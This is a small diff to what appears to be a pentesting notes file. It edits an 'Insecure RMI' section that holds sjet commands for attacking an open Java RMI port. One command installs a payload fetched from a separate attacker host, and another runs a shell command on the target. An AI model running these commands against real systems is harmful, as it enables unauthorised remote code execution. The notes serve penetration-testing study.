@@ -924,10 +924,11 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
 ## Insecure RMI
+-> Example:  
+Open port Java RMI 9991
 `jython sjet.py 192.168.11.136 9991 password install http://192.168.11.132:8000 8000`  
-https://github.com/siberas/sjet  
 `jython sjet.py 192.168.11.136 9991 password command "ls -la"`  
--> Need
+https://github.com/siberas/sjet  
 http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar  
 
 ## Null Origin Exploitation
